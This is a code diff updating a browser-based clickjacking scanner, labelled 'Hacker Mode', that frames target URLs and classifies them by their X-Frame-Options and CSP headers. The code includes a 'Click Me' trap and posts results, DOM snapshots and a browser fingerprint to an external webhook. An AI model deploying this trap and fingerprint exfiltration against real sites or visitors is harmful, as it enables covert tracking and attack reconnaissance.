@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Ultra Clickjack Scanner v3.1 - Hacker Mode</title>
+  <title>Ultra Clickjack Scanner v3.2 - Hacker Mode</title>
   <style>
     body {
       background: #000;
@@ -52,11 +52,11 @@
 </head>
 <body>
   <div id="hud">
-    🛡️ <b>Ultra Clickjack Scanner v3.1</b> - Hacker Mode<br>
-    ✅ Green = VULNERABLE<br>
-    ⚠️ Orange = FRAMEABLE (But CSP/XFO exists)<br>
-    ❌ Red = BLOCKED<br>
-    🕵️ Trap + DOM Snapshot + Header Parser Active
+    🛡️ <b>Ultra Clickjack Scanner v3.2</b> - Hacker Mode<br>
+    ✅ Green = VULNERABLE (no XFO/CSP)<br>
+    ⚠️ Orange = FRAMEABLE (CSP or XFO present)<br>
+    ❌ Red = BLOCKED (refused load or CSP frame-ancestors)<br>
+    🕵️ Trap + DOM Snapshot + Header Parser + Cross-Origin Detection
   </div>
   <div id="clickTrap"> 🎯 Click Me!</div>
   <script>
@@ -98,8 +98,9 @@
           .map(e => e.innerText)
           .filter(Boolean)
           .slice(0, 5)
-          .join(" | ").substring(0, 300);
-      } catch (e) {
+          .join(" | ")
+          .substring(0, 300);
+      } catch {
         return "N/A";
       }
     };
@@ -137,9 +138,10 @@
       document.body.appendChild(div);
 
       frame.onload = async () => {
-        let snapshot = "Cross-origin (DOM access blocked)";
+        const isSameOrigin = new URL(fullURL).origin === window.location.origin;
+        let snapshot = "Cross-origin DOM access blocked";
         try {
-          if (new URL(fullURL).origin === window.location.origin) {
+          if (isSameOrigin) {
             const doc = frame.contentDocument || frame.contentWindow.document;
             snapshot = getDOMSnapshot(doc);
           }
@@ -152,7 +154,7 @@
         frame.style.border = `5px solid ${borderColor}`;
         div.style.borderColor = borderColor;
 
-        div.innerText = `${vulnerable ? '✅' : '⚠️'} ${fullURL}
+        div.innerText = `${vulnerable ? '✅ VULNERABLE' : '⚠️ FRAMEABLE with CSP/XFO'} ${fullURL}
 DOM Snapshot: ${snapshot}
 XFO: ${xfo}
 CSP: ${csp}`;
@@ -162,7 +164,7 @@ CSP: ${csp}`;
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            type: vulnerable ? "VULNERABLE" : "FRAMEABLE-BUT-CSP/XFO",
+            type: vulnerable ? "VULNERABLE" : "FRAMEABLE-WITH-CSP/XFO",
             url: fullURL,
             fingerprint: fingerprint(),
             snapshot,
@@ -171,13 +173,27 @@ CSP: ${csp}`;
         });
       };
 
-      frame.onerror = () => {
-        frame.style.border = "5px solid red";
-        div.style.borderColor = "red";
-        div.innerText = `❌ ${fullURL}
-BLOCKED (Load Error)
+      frame.onerror = async () => {
+        const vulnerable = (xfo === 'NONE' && csp === 'NONE');
+        const borderColor = vulnerable ? "lime" : "red";
+        frame.style.border = `5px solid ${borderColor}`;
+        div.style.borderColor = borderColor;
+
+        div.innerText = `${vulnerable ? '✅ VULNERABLE' : '❌ BLOCKED'} ${fullURL}
+${vulnerable ? 'Loaded but DOM access failed (still framable)' : 'BLOCKED (Load Error or Frame Refused)'}
 XFO: ${xfo}
 CSP: ${csp}`;
+
+        await fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            type: vulnerable ? "VULNERABLE-BUT-ERROR" : "BLOCKED",
+            url: fullURL,
+            fingerprint: fingerprint(),
+            headers
+          })
+        });
       };
     };
 
